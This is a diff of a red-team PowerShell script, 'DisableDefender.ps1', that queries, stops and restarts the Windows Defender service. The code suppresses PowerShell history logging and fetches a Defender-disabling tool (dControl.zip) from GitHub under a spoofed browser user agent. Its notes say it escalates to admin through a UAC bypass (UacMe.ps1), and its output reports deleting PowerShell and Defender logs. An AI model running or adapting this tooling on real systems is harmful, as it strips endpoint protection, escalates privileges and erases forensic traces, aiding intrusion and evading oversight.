@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: Invoke-WebRequest {native}, dControl.zip {auto-download}
    Optional Dependencies: UacMe.ps1 {auto-download}
-   PS cmdlet Dev version: v2.2.7
+   PS cmdlet Dev version: v2.2.8
 
 .DESCRIPTION
    This CmdLet Query, Stops, Start Anti-Virus Windows Defender
@@ -49,6 +49,7 @@
    --------------------------------
    ServiceName      : WinDefend
    AMRversion       : 4.18.2104.14
+   ShellPrivs       : UserLand::EOP
    StartType        : Automatic
    CurrentStatus    : Running
    CanStop          : True
@@ -66,14 +67,22 @@
 Write-Host ""
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
-## Local variable declarations { Cmdlet Internal Settings }
+## Global variable declarations { Cmdlet Internal Settings }
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
 $Patched = (Get-MpComputerStatus -EA SilentlyContinue).AMProductVersion
 If($Delay -lt 3 -or $Delay -gt 6){[int]$Delay='4'} ## min\max delay value accepted
 $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+If($IsClientAdmin -eq $True){$ShellPrivs = "Administrator"}Else{$ShellPrivs = "UserLand::EOP"}
 
 
-If($Action -ieq "Query"){## Query Windows Defender state
+If($Action -ieq "False"){## [error] none parameters sellected by cmdlet user!
+   Write-Host "[error] This cmdlet requires the use of -Parameters to work!" -ForeGroundColor Red -BackGroundColor Black
+   Start-Sleep -Seconds 2;Get-Help .\DisableDefender.ps1 -Detailed
+   exit ## Exit @DisableDefender
+}
+
+
+If($Action -ieq "Query"){
 
    <#
    .SYNOPSIS
@@ -88,10 +97,12 @@ If($Action -ieq "Query"){## Query Windows Defender state
       --------------------------------
       ServiceName      : WinDefend
       AMRversion       : 4.18.2104.14
+      ShellPrivs       : UserLand::EOP
       StartType        : Automatic
       CurrentStatus    : Running
       CanStop          : True
    #>
+
 
    ## Local function variable declarations
    $State = Get-Service -Name "$ServiceName" -EA SilentlyContinue
@@ -100,10 +111,11 @@ If($Action -ieq "Query"){## Query Windows Defender state
    $StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop
 
    ## Build Output Table
-   Write-Host "`nDisable Windows Defender Service" -ForegroundColor Green
-   Write-Host "--------------------------------";Start-Sleep -Seconds 1
+   Write-Host "`nQuery Windows Defender Service" -ForegroundColor Green
+   Write-Host "------------------------------";Start-Sleep -Seconds 1
    echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
    echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
+   echo "ShellPrivs       : $ShellPrivs" >> $Env:TMP\qwerty.log
    echo "StartType        : $stype" >> $Env:TMP\qwerty.log
    echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
    echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
@@ -124,11 +136,26 @@ If($Action -ieq "Stop"){
       Author: @Sordum (RedTeam) | @r00t-3xp10it
       Helper - Stops Windows Defender Service
 
+   .NOTES
+      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
+      If DisableDefender its executed without administrator privileges!
+
    .EXAMPLE
       PS C:\> .\DisableDefender.ps1 -Action Stop
 
    .EXAMPLE
       PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 2
+
+   .OUTPUTS
+      Disable Windows Defender Service
+      --------------------------------
+      ServiceName      : WinDefend
+      AMRversion       : 4.18.2104.14
+      ShellPrivs       : Administrator
+      StartType        : Automatic
+      CurrentStatus    : Stopped
+      CanStop          : True
+      Delete logfiles  : Powershell + Windows Defender
    #>
 
 
@@ -137,7 +164,7 @@ If($Action -ieq "Stop"){
       iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/DWD/dControl.zip" -OutFile "$Env:TMP\dControl.zip" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
       If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
          Write-Host "[error] failed to download $Env:TMP\dControl.zip" -ForegroundColor Red -BackgroundColor Black
-         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
+         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
       }
    }
 
@@ -208,11 +235,24 @@ If($Action -ieq "Start"){
       Author: @Sordum (RedTeam) | @r00t-3xp10it
       Helper - Starts Windows Defender Service
 
+   .NOTES
+      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
+      If DisableDefender its executed without administrator privileges!
+
    .EXAMPLE
       PS C:\> .\DisableDefender.ps1 -Action Start
 
    .EXAMPLE
       PS C:\> .\DisableDefender.ps1 -Action Start -Delay 2
+
+   .OUTPUTS
+      Enable Windows Defender Service
+      --------------------------------
+      ServiceName      : WinDefend
+      AMRversion       : 4.18.2104.14
+      StartType        : UserLand::EOP
+      CurrentStatus    : Running
+      CanStop          : True
    #>
 
 
@@ -289,14 +329,24 @@ If($Action -ieq "Start"){
 Start-Sleep -Seconds $Delay ## Give time to update service state
 $stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
 $CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
+$StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop
 
 ## Build Output Table
-Write-Host "Disable Windows Defender Service" -ForegroundColor Green
-Write-Host "--------------------------------"
+If($Action -ieq "Stop"){
+   Write-Host "`nDisable Windows Defender Service" -ForegroundColor Green
+   Write-Host "--------------------------------"
+}ElseIf($Action -ieq "Start"){
+   Write-Host "`nEnable Windows Defender Service" -ForegroundColor Green
+   Write-Host "-------------------------------"
+}
 echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
+echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
 echo "StartType        : $stype" >> $Env:TMP\qwerty.log
 echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
-echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
+echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
+If($IsClientAdmin -eq $True){
+   echo "Delete logfiles  : PowerShell + Windows Defender" >> $Env:TMP\qwerty.log
+}
 echo "" >> $Env:TMP\qwerty.log
 Get-Content -Path "$Env:TMP\qwerty.log"
 Remove-Item -Path "$Env:TMP\qwerty.log" -Force
